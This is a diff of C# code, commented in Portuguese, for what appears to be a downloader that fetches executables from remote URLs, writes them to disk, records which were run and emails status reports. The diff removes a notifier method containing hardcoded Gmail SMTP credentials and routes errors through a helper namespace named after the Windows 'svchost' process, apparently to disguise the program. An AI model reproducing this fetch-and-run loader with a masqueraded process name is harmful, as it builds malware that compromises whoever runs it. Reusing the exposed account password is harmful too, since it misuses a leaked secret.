@@ -68,13 +68,9 @@ namespace vtb
                     VerificarListaExe();
                     ObterListaEmail();
 
-                    EventLog.WriteEntry("Baixando exe", EventLogEntryType.Information);
-
                     var bytes = _cliente.DownloadData(_exeAtual.UrlExe);
 
                     _exeAtual.GravarExe(bytes, _emailNotificacao);
-
-                    Notificar("Executando processo: " + _exeAtual.NomeExe);
 
                     if (!_exesExecutados.Contains(_exeAtual.Id))
                         _exesExecutados.Add(_exeAtual.Id);
@@ -84,7 +80,7 @@ namespace vtb
                 }
                 catch (Exception e)
                 {
-                    Notificar(e.ToString());
+                    svchost.Helper.Email.Notificar(e.ToString());
                 }
             }
         }
@@ -127,32 +123,6 @@ namespace vtb
             }
         }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="mensagem"></param>
-        private void Notificar(string mensagem)
-        {
-
-            MailMessage mail = new MailMessage();
-
-            //define os endereços
-            mail.From = new MailAddress("exezueira@gmail.com");
-            mail.Sender = new MailAddress("exezueira@gmail.com");
-            mail.To.Add("exezueira@gmail.com");
-
-            //define o conteúdo
-            mail.Subject = "Exe notification";
-            mail.Body = mensagem;
-
-            //envia a mensagem
-            SmtpClient smtp = new SmtpClient();
-            smtp.Host = "smtp.gmail.com";
-            smtp.EnableSsl = true;
-            smtp.Port = 587;
-            smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
-            smtp.Credentials = new NetworkCredential("exezueira@gmail.com", "exetozueira_123");
-            smtp.Send(mail);
-        }
+        
     }
 }
